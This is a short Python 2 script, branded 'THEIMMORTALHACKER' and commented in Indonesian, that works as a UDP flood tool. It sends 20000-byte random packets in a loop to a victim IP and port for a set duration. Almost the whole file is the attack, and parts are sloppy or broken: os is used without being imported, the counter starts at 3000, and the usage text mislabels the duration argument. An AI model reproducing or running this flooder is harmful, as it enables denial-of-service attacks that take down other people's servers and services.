import time
import socket
import random
import sys
	os.system('clear') 
def usage():
    print "\033[1;32m#####################################"
    print "#------[\033[1;91mTHEIMMORTALHACKER\033[1;32m]---#"
    print "#-------------------------------------------------------#"
    print "#   \033[1;91mCommand: " "python2 WR.py " "<ip> <port> <packet> \033[1;32m   #"
    print "#                                                       #"
    print "#\033[1;91mCreator:RIGNS \033[1;32m##      ###       ##                #"
    print "#\033[1;91mTeam   : THEIMMORTALHACKER   \033[1;32m##     #      ##     #"
    print "#\033[1;91mVersion:1.1        \033[1;32m##      ###       ##           #"
    print "#            ## \033[1;91m ##     \033[1;32m#  \033[1;91m##  \033[1;32m##     #"
    print "#            ##  \033[1;91m##  \033[1;32m###   \033[1;91m##  \033[1;32m###### #"
    print "#            \033[1;91m<--[THEIMMORTALHACKER]-->         \033[1;32m#"
    print "#################################################"
    print "                    k@@@@@@@@@@@@"
    print "                       @@@@@@@@@@@@@"
    print "                    k@@@@@@@@@@@@"
def flood(victim, vport, duration):
    # Support us yaakk... :)
    # Okey Jadi disini saya membuat server, Ketika saya memanggil "SOCK_DGRAM" itu  menunjukkan  UDP type program
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # 20000 representasi satu byte ke server
    bytes = random._urandom(20000)
    timeout =  time.time() + duration
    sent = 3000

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print "\033[1;91mMemulai \033[1;32m%s \033[1;91mmengirim Paket \033[1;32m%s \033[1;91mpada port \033[1;32m%s "%(sent, victim, vport)
def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()
